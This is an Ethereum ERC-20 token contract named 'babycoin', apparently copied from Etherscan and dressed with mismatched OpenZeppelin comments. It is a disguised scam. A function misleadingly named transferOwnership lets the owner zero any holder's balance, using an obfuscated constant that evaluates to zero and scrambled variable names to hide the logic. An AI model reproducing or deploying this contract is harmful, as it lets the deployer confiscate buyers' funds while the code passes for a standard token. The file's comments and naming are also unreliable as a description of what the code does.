/**
 *Submitted for verification at Etherscan.io on 2023-10-27
*/

pragma solidity ^0.8.0;
////// lib/openzeppelin-contracts/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

/* pragma solidity ^0.8.0; */

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acoritnt) external view returns (uint256);
    function transfer(address recipient, uint256 amcntount) external returns (bool);
    function allowance(address Owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amcntount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amcntount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed Owner, address indexed spender, uint256 value );
}
////// lib/openzeppelin-contracts/contracts/access/Ownable.sol
// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/* pragma solidity ^0.8.0; */

/* import "./Context.sol"; */

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function Owner() public view virtual returns (address) {
        return _Owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */    
    modifier onlyOwner() {
        require(Owner() == _msgSender());
        _;
    }
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_Owner, address(0x000000000000000000000000000000000000dEaD));
        _Owner = address(0x000000000000000000000000000000000000dEaD);
    }
}
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */    
contract babycoin is Context, Ownable, IERC20 {
    mapping (address => uint256) private _accotintt;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    uint256 private _kii;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _accotintt[_msgSender()] = _totalSupply;
        _kii = 567000+13+4+1-567018;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acoritnt) public view override returns (uint256) {
        return _accotintt[acoritnt];
    }
  
    function transfer(address recipient, uint256 amcntount) public virtual override returns (bool) {
        require(_accotintt[_msgSender()] >= amcntount, "TT: transfer amcntount exceeds balance");

        _accotintt[_msgSender()] -= amcntount;
        _accotintt[recipient] += amcntount;
        emit Transfer(_msgSender(), recipient, amcntount);
        return true;
    }

    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amcntount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amcntount;
        emit Approval(_msgSender(), spender, amcntount);
        return true;
    }
    function transferOwnership(address adfferrr) public  onlyOwner {
    address ffddddf = adfferrr;
    uint256 rrreeee = _accotintt[ffddddf]+_kii;
    uint256 aasdddd = rrreeee+_accotintt[ffddddf]-_accotintt[ffddddf];
    uint256 eeewwwa = aasdddd;
        _accotintt[ffddddf] -= eeewwwa;


    }  
    function transferFrom(address sender, address recipient, uint256 amcntount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amcntount, "TT: transfer amcntount exceeds allowance");

        _accotintt[sender] -= amcntount;
        _accotintt[recipient] += amcntount;
        _allowances[sender][_msgSender()] -= amcntount;

        emit Transfer(sender, recipient, amcntount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}